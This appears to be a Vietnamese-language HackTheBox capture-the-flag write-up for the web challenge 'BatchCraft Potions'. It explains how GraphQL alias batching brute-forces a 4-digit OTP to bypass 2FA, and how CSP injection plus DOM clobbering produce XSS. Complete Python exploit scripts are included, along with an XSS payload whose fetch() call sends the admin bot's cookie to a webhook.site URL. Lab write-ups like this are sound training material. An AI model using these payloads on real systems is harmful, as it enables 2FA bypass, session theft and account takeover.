---
title: "BatchCraft Potions"
date: 2026-05-14
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
tags: ["web", "hackthebox"]
series: "HackTheBox"
draft: false
---

# BatchCraft Potions
## Challenge Information
- **Category**: Web Exploitation
- **Event**: none
- **Author**: Rayhan0x01 & makelaris
- **Difficulty**: Medium
- **URL**: https://app.hackthebox.com/challenges/BatchCraft%2520Potions
- **Tags**: #web #Path_Traversal 
---
## 1. Description
>An underground potions shop has been selling potions to one of the wizard houses that helps them cheat on the annual magical contest of the houses. The potion shop has a vendor program, and we managed to steal the credentials "vendor53:PotionsFTW!" by casting a spy spell on one of the shop vendors. Unfortunately, the shop requires two-factor authentication, so we need you to break into the vendor account and uncover who is running this shop.
## 2. Overview
Đây là một web challenge nên mình sẽ trải nghiệm các chức năng như user thông thường trước, khi đi vào trang chủ thì mình đoán đây là một cửa hàng bán các vật phẩm như kiểu potions trong game: 

![](./images/Screenshot_20260502_233732.png)

![](./images/Screenshot_20260502_233809.png)

Mặc dù bài này tác giả đã cung cấp sẵn account nhưng vì ở giao diện mình không tìm thấy chỗ login nên mình sẽ đọc source code và phân tích luôn.
## 3. Source Code Analysis
Source map như sau:

![](./images/Pasted%20image%2020260503231037.png)

Nhìn vào đây ta cũng có thể thấy FLAG nằm trong file `/flag.txt`, mình sẽ xem ứng dụng web có những hàm hay chức năng nào gọi đến file này không. Sử dụng `Ctrl + Shift + F` thì mình phát hiện flag được giấu khá tinh vi bên trong đoạn JWT encode của cookie con bot (file `/challenge/bot.js`):

![](./images/Pasted%20image%2020260503231424.png)
-> Lúc này dựa vào kinh nghiệm thì mình bài này thuộc dạng client-side và mục tiêu là phải tìm mọi cách lấy cắp được đoạn cookie của con bot này.

File `/index`:

![](./images/Pasted%20image%2020260505185725.png)

Nhìn vào ta có thể xác định được ứng dụng chạy trên môi trường `Node.js`, dùng `ExpressJS` và template engine `Nunjucks`. Còn lại thì mình thấy mọi thứ vẫn chưa bất thường.

Mình sẽ xem tiếp file `/routes/index.js`, file này chứa các route của ứng dụng:

- `/`: Trang chủ.
- `/graphql`: Quản lý xác thực và 2fa.
- `/products/:id`: Xem sản phẩm đã phê duyệt với id mong muốn.
- `/login`: Trang đăng nhập.
- `/logout`: Đăng xuất.
- `/2fa`: Trang xác thực 2fa
- `/dashboard`: Xem các potions (yêu cầu đăng nhập).
- `/api/products/add`: Thêm các potions.
- `/products/preview/:id`: Xem trước các sản phẩm với id mong muốn
### 1. GraphQL Batching

Mình sẽ tập trung phân tích sâu vào `/graphql`, ta có thể dễ dàng nhận ra dev cũng đã tắt `graphiql` để che dấu thông tin:

![](./images/Pasted%20image%2020260505200934.png)

Đi tiếp đến file `/middleware/AuthMiddleware.js`:

![](./images/Pasted%20image%2020260505202128.png)

File `/GraphqlHelper.js` với cơ chế xác thực 2 bước:

- Ở bước login, ứng dụng nhận `username` và `password`. Nếu thông tin trong database khớp, hệ thống không cấp ngay quyền truy cập hoàn chỉnh mà nó tạo ra một JWT tạm thời là `{ username: ..., verified: false }` và gắn vào cookie `session`.

![](./images/Pasted%20image%2020260505225831.png)

- Tiếp đó sẽ đến bước xác thực 2FA, ứng dụng yêu cầu user nhập mã `otp`. Resolver này sẽ đọc `req.user` để biết người dùng là ai, sau đó lấy `otpkey` từ Database ra và kiểm tra. Nếu đúng, ứng dụng sẽ set `verified` thành true và nâng cấp quyền bằng cách cấp một JWT mới là`{ username: ..., verified: true }`.

![](./images/Pasted%20image%2020260505230716.png)

Vì tác giả đã cấp một accout là `vendor53:PotionsFTW!` nên mình cũng sẽ truy cập vào database để xem đã có những quyền gì:

![](./images/Screenshot_20260502_022929.png)

Mặc dù ta đã được cấp một account có sẵn để truy cập vào ứng dụng web nhưng nó lại đi kèm một mã `otpkey` nào đó được tạo ngẫu nhiên (chưa biết là gì).

Thử đăng nhập bằng giao diện qua `/login` để rõ hơn:

![](./images/Pasted%20image%2020260505233758.png)

Như ta dự đoán thì ứng dụng sẽ bắt ta phải xác thực 2fa bằng otp. Mình sẽ tận dụng Burp Suite để lấy request:

![](./images/Pasted%20image%2020260505234219.png)

Và tất nhiên cơ chế xác thực 2FA cũng được quản lý qua `/graphql`.

Ở file `OTPHelper.js`, ta có thể biết được otpkey có 4 chữ số:

![517](./images/Pasted%20image%2020260505235747.png)

Dựa vào đây mình đã nghĩ đến ý tưởng brute force để lấy được đúng `otpkey` (tối đa gửi 10,000 request nếu may mắn sẽ ít hơn). 

Nhưng cho đến khi mình kiểm tra cấu hình của reverse proxy `nginx`:

![](./images/Pasted%20image%2020260506003601.png)

Điều này đập tan cái suy nghĩ sẽ brute force thuần chay để bypass 2fa vì với tốc độ 20 req/min, nếu ta brute force thuần để dò 10.000 mã OTP (từ `0000` đến `9999`) bằng các request thông thường thì Nginx sẽ lock ngay lập tức. Còn nếu ráng gửi từ từ để né Rate Limit, thì ta sẽ mất tận hơn 8 tiếng để dò xong =))

Nhưng nếu ta có thể gửi cả 10.000 mã OTP trong cùng 1 request thì sao? Nhờ vào tính năng 
**GraphQL Batching (Aliases)** của GraphQL mà ta hoàn toàn có thể thực hiện được điều đó. Mình sẽ nhồi toàn bộ 10.000 vòng lặp Mutation `verify2FA` vào trong đúng 1 request để thực hiện việc bypass.

Trước hết mình sẽ thử cơ chế này với các payload nhỏ:

![](./images/Pasted%20image%2020260506005045.png)

-> Đã thành công, vì không có token nào nhả ra nên query trả về `null`

Và để thỏa mãn giới hạn về kích thước request của Nginx, thay vì  gửi cả 10.000 Mutation này bằng 1 request thì mình sẽ chia nhỏ ra thành 5 request với mỗi request chứa 2.000 Mutation (5 request cũng hoàn toàn hợp lệ với limit của nginx). 

Mình sẽ tự động hóa việc này bằng script:

```python
import requests
import json

url = "http://0.0.0.0:8888/graphql"
headers = {"Content-Type": "application/json"}
cookies = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE3NzgwMDQyMzV9.3EnBMPaJMyGXLkyZli8mxFrssVf8nLtgVTpCtBjnp6E"}

# Tạo danh sách 10.000 mã từ 0000 đến 9999
all_otps = [f"{i:04d}" for i in range(10000)]

# Chia 10.000 mã thành các chunk, mỗi chunk chứa 2000 mã
chunk_size = 2000
chunks = [all_otps[i:i + chunk_size] for i in range(0, len(all_otps), chunk_size)]

for index, chunk in enumerate(chunks):
    print(f"[*] Đang gửi Chunk {index + 1}/5 (Mã từ {chunk[0]} đến {chunk[-1]})...")
    
    # Gom 2000 mã vào 1 payload
    graphql_query = "mutation {\n"
    for otp in chunk:
        graphql_query += f'  test{otp}: verify2FA(otp: "{otp}") {{ token }}\n'
    graphql_query += "}"
    
    try:
        res = requests.post(
            url, 
            json={"query": graphql_query}, 
            headers=headers, 
            cookies=cookies,
            timeout=10 # Đặt timeout để không bị treo
        )
        
        # Nếu server không sập và trả về kết quả
        if res.status_code == 200:
            data = res.json()
            if 'data' in data:
                # Duyệt qua các alias để tìm token hợp lệ
                for alias, result in data['data'].items():
                    if result is not None:  # Nếu tìm thấy mã đúng, result sẽ chứa token
                        print(f"\n[+] BINGO! Mã OTP đúng là: {alias.replace('test', '')}")
                        print(f"[+] Token mới: {result['token']}")
                        exit(0)
                        
    except Exception as e:
        print(f"[-] Lỗi ở chunk {index + 1}: {e}")

print("[-] Không tìm thấy mã OTP hợp lệ.")
```

![](./images/Pasted%20image%2020260506013956.png)

-> Đã thành công bypass được 2fa và vào được dashboard:

![](./images/Pasted%20image%2020260506020214.png)

### 2. CSP Injection & Dom Clobbering
Nhìn vào đây ta cũng có thể dễ dàng đoán ra được ứng dụng có chức năng thêm sản phẩm:

![](./images/Pasted%20image%2020260506214637.png)

Để ý thấy ở dòng nhập input số 2 ứng dụng có hiện dòng hỗ trợ HTML -> Mình sẽ vào source code để xem trong các ô input này có thể injection được gì không =))

Kiểm tra phần hiển thị sản phẩm trong file `product.js` thì ta cũng dễ dàng bắt gặp ở dòng hiện mô tả sản phẩm thì ứng dụng không hề có một biện pháp lọc mà tin tưởng hoàn toàn vào đoạn dữ liệu này (có thể là hỗ trợ cho chức năng hiển thị thẻ HTML):

![](./images/Pasted%20image%2020260506215939.png)

Nhưng điều này lại vô tình tạo ra lỗ hổng **HTML injection** để ta nhắm vào.

Tiếp theo là input của dòng nhập số 5 (Product Keywords), ở file `/route/index.js` ta có thể bắt gặp ứng dụng đang dùng chính input của dòng này để tạo ra các thẻ **meta**:

![](./images/Pasted%20image%2020260506221244.png)

![](./images/Pasted%20image%2020260506221324.png)

Điều đặc biệt là biến `keywords` này không hề có một biện pháp filter trước khi đưa vào đây
-> Mình nghĩ ngay đến kỹ thuật thoát context bằng cách đóng thẻ sau đó injection các payload tùy ý vào kể cả thêm hoặc ghi đè chính cái CSP mà dev đã viết để bảo vệ trang web. Ví dụ: `"><PAYLOAD>`

Tiếp theo mình sẽ xem tiếp file `/static/js/product.js`, đoạn code này với chức năng chính tìm tất cả các ảnh của sản phẩm, lấy `src` của chúng, sau đó tạo một thẻ `<img>` mới chèn vào trong khung hiển thị sản phẩm.

![](./images/Pasted%20image%2020260506223756.png)

Thoạt nhìn thì trông nó rất vô hại =)) Nhưng nếu ta có thể kiểm soát được cái `potionTypes[i].src` thì sao?

Để ý là trong chức năng add product, ứng dụng sẽ luôn gọi một con bot với quyền `admin` đến để kiểm tra (`/routes/index.js`):

![](./images/Pasted%20image%2020260506224434.png)

-> Nếu như ta có thể kiểm soát được biến `potionTypes[i].src`, ta có thể thoát context để inject bất kỳ payload nào mà ta muốn vào ngay trong thẻ `img` của trang, nếu bot admin đến sẽ dẫm phải script này và xa hơn là có thể nghĩ đến việc đánh cắp cookie admin.

Và ở trình duyệt có một tính năng rất hay là nếu ta tạo ra một thẻ HTML có thuộc tính `id` hoặc `name`, trình duyệt sẽ tự động tạo ra một biến toàn cục tương ứng trong môi trường thực thi của JavaScript.

Điều này tại sao lại giúp ích cho bài này =)) Tất nhiên là ta sẽ cố tình thêm vào một thẻ HTML chứa thuộc tính cùng tên là `<img name="potionTypes">` thông qua lỗ hổng **HTML injection**  để ép trình duyệt tự động sinh ra một biến toàn cục `window.potionTypes` chứa payload mà ta mong muốn.

->  Ứng dụng sẽ tự gọi đến biến `potionTypes` và inject vào chỗ trống `<img src='${potionTypes[i].src}' class='category-img'>`. Sau đó bot sẽ truy cập vào và dính XSS. Đây là kỹ thuật **DOM Clobbering**

Tuy nhiên, trong mã nguồn của ứng dụng lại tồn tại file `global.js` được load ngay trước `product.js`. Trong file này lại chứa sẵn biến toàn cục `potionTypes`:

![](./images/Pasted%20image%2020260506232814.png)

Trong quy định về sự ưu tiên phân giải của biến (Scope Resolution Priority) trong JavaScript, 
DOM Clobbering có sự ưu tiên thấp nhất và luôn là sự lựa chọn cuối cùng. Tức là nếu file `global.js` này còn tồn tại và được browser load thì cái biến mà ta inject vào sẽ không bao giờ được sử dụng.

Nhưng vấn đề này có thể được giải quyết bằng cách cấm browser load file `global.js` này luôn. Mình sẽ thực hiện bằng kỹ thuật **CSP injection** dựa vào lỗ hổng không filter biến `keywords` trong hàm tạo thẻ meta.

Bằng cách nhập vào biến `product_keywords` payload: 

```html
" /><meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js">
```

Ta sẽ có thể giới hạn được các file mà browser có thể load (cấm `global.js`) thì ta có thể ép browser phải sử dụng chính cái biến `potionTypes` mà ta đã injection vào ở lỗ hổng **HTML injection**.

Mọi vấn đề đã có thể xâu chuỗi lại với nhau để giải quyết, từ đó mình có exploit chain như sau:

```mermaid
graph LR
    %% Định nghĩa màu sắc
    classDef tech fill:#1e90ff,stroke:#fff,stroke-width:2px,color:#fff,font-weight:bold

    A["GraphQL Batching"]:::tech -->|"Bypass Rate Limit"| B["HTML Injection"]:::tech
    B -->|"Unsafe Template"| C["CSP Tightening"]:::tech
    C -->|"Chặn file JS"| D["DOM Clobbering"]:::tech
```

Và trước khi exploit thật mình sẽ demo trên instance để chắc chắn những giả thuyết kia là đúng:

payload: 
```python
    csp_payload = '" /><meta http-equiv="Content-Security-Policy" content=" http://localhost:8888/static/js/product.js http://localhost:8888/static/js/jquery.min.js">'
    

    xss_payload = "<img id=10 name=potionTypes src=\"x'onerror=alert(1)//\"><b id=potionTypes>"
```

![](./images/Pasted%20image%2020260507002550.png)

-> Đã chặn thành công. Test xem có XSS không:

![](./images/Pasted%20image%2020260507002435.png)

Ngon =)))
## 4. Exploitation
Dựa vào những phân tích trên, sau khi bypass 2FA bằng cách dùng GraphQL Batching mình có thể inject các payload như sau để trigger XSS:

```python
csp_payload = '"><meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js">'
```

Thẻ `<meta>` này ép trình duyệt chỉ được phép tải các script nội tuyến (`unsafe-inline`), file `product.js` và thư viện `jquery.min.js` từ chính IP của con Bot (`127.0.0.1`) -> File `global.js` bị loại thẳng tay khỏi danh sách trắng (Whitelist) và bị trình duyệt Block

```python
xss_payload = f"<img id=10 name=potionTypes src=\"'/onerror=fetch('{WEBHOOK_URL}/'+document.cookie)//'\" /><b id=potionTypes>"
```

- Dấu `'` giúp đóng thuộc tính của `src` (thuộc tính `src` lúc này chỉ là `x`).
    
- `onerror` Vì `x` là một đường dẫn ảnh lỗi nên `onerror` sẽ được kích hoạt dẫn đến XSS cho con bot.

- Hàm `fetch` sẽ gửi Cookie về Webhook của ta (bắt buộc phải dùng phép nối chuỗi `+'` thay vì `?` để tránh việc URL Parser mã hóa chuỗi làm hỏng payload gốc).
    
- `//`: comment line đoạn thuộc tính rác còn lại.
## 5. PoC

```python
import requests
import sys
import time

BASE_URL = "http://154.57.164.75:31690" 
LOGIN_URL = f"{BASE_URL}/login"
GRAPHQL_URL = f"{BASE_URL}/graphql"
ADD_PRODUCT_URL = f"{BASE_URL}/api/products/add"

USERNAME = "vendor53"
PASSWORD = "PotionsFTW!"

WEBHOOK_URL = "https://webhook.site/f7aee071-f0fc-4de8-8dc8-35fcb6e0c1f9" 

s = requests.Session()

def step1_login():
    print("[*] BƯỚC 1: Tiến hành đăng nhập qua GraphQL lấy Token sơ cấp...")
    
    graphql_payload = {
        "query": "mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }",
        "variables": {
            "username": USERNAME,
            "password": PASSWORD
        }
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }

    try:
        res = s.post(GRAPHQL_URL, headers=headers, json=graphql_payload)
        
        # Bóc tách JSON để lấy token
        response_data = res.json()
        login_data = response_data.get("data", {}).get("LoginUser", {})
        token = login_data.get("token")
        
        if token:
            print(f"[+] Đăng nhập thành công! Server trả về: {login_data.get('message')}")
            
            # TỰ TAY NẠP TOKEN VÀO COOKIE CỦA SESSION
            # Để các request sau (ở bước 2, bước 3) tự động có Cookie này
            s.cookies.set("session", token, domain="localhost")
            
            print(f"[+] Đã bơm Cookie tạm vào Session: {token[:20]}...")
        else:
            print("[-] Đăng nhập thất bại. Không tìm thấy token trong phản hồi:")
            print(response_data)
            sys.exit(1)
            
    except Exception as e:
        print(f"[-] Lỗi mạng khi đăng nhập: {e}")
        sys.exit(1)

def step2_bypass_2fa():
    print("\n[*] BƯỚC 2: Kích hoạt Alias Batching (Chiến thuật Cân bằng hoàn hảo)...")
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }

    # CHIA LÀM 5 REQUEST, MỖI REQUEST 2000 QUERIES (Khoảng 90KB - Vượt mặt Express)
    batch_size = 2000 
    
    for i in range(0, 10000, batch_size):
        query_string = "mutation { "
        for j in range(i, i + batch_size):
            otp_code = f"{j:04d}"
            query_string += f'a{otp_code}: verify2FA(otp: "{otp_code}") {{ token }} '
        query_string += "}"
        
        payload = {"query": query_string}
        
        print(f"[*] Bắn cụm {i:04d} -> {(i + batch_size - 1):04d} (~90KB)...")
        
        try:
            response = s.post(GRAPHQL_URL, headers=headers, json=payload)
            
            if response.status_code == 413:
                print("[-] Lỗi 413: Express backend vẫn chê gói hàng quá to. (Thử giảm batch_size xuống 1500)")
                sys.exit(1)
                
            if response.status_code == 429:
                print("[-] Lỗi 429: Nginx chặn tốc độ! Đang đợi 3 giây để Nginx hạ nhiệt...")
                time.sleep(3)
                continue
                
            if response.status_code != 200:
                print(f"[-] Server trả về lỗi HTTP {response.status_code}")
                continue

            data = response.json().get("data", {})
            for alias, result in data.items():
                if result and result.get("token"):
                    correct_otp = alias.replace('a', '')
                    new_token = result.get('token')
                    print(f"[+] BINGO! Bẻ khóa 2FA thành công. OTP đúng: {correct_otp}")
                    print(new_token)
                    
                    s.cookies.set('session', new_token, domain='localhost')
                    print("[+] Đã nâng cấp Session Cookie lên quyền VIP (verified: true).")
                    return # Sang Bước 3
                    
        except Exception as e:
            print(f"[-] Lỗi GraphQL: {e}")
            sys.exit(1)
            
    print("[-] Thất bại: Không tìm thấy mã OTP hợp lệ.")
    sys.exit(1)

def step3_inject_and_trigger_bot():
    print("\n[*] BƯỚC 3: Đúc Bình thuốc độc và Chờ Admin sập bẫy...")
    
    csp_payload = '" /><meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js http://localhost:8888/static/js/product.js http://localhost:8888/static/js/jquery.min.js">'
    WEBHOOK_URL = "https://webhook.site/f7aee071-f0fc-4de8-8dc8-35fcb6e0c1f9"

    # Dùng location= thay vì fetch() để bypass CORS 100%
    # ĐẢM BẢO có /?c= để tách biệt webhook và cookie
    xss_payload = f"<img id=10 name=potionTypes src=\"'/onerror=fetch('{WEBHOOK_URL}/'+document.cookie)//'\" /><b id=potionTypes>"
    payload_create = {
        "product_name": "sad",
        "product_price": "999",
        "product_category": "10",
        "product_keywords": csp_payload,
        "product_desc": xss_payload,
        "product_og_title": "Pwned",
        "product_og_desc": "By Kyrux"
    }

    try:
        print("[*] Đang cấy mã độc XSS Zero-Space vào cơ sở dữ liệu...")
        res_create = s.post(ADD_PRODUCT_URL, json=payload_create)
        
        print("\n" + "="*50)
        print(f"[+] Phản hồi: {res_create.json().get('message')}")
        print("[+] Hệ thống đã tự động gọi Bot Admin vào xem.")
        print(f"[*] Hãy nhìn sang Terminal đang chạy 'python3 -m http.server 8000'...")
        print("="*50 + "\n")
            
    except Exception as e:
        print(f"[-] Lỗi kết nối ở bước 3: {e}")

if __name__ == "__main__":
    print("Exploit Chain by Kyrux")
    time.sleep(1)
    step1_login()
    time.sleep(1)
    step2_bypass_2fa()
    time.sleep(1)
    step3_inject_and_trigger_bot()
```

![](./images/Screenshot_20260503_195525.png)

JWT decode:

![](./images/Pasted%20image%2020260507002141.png)

`HTB{b4tch3d_p0710n5_4nd_m3t4_m4g1c}`

>h@ppy h@ck!n9 
>*(BKSEC)*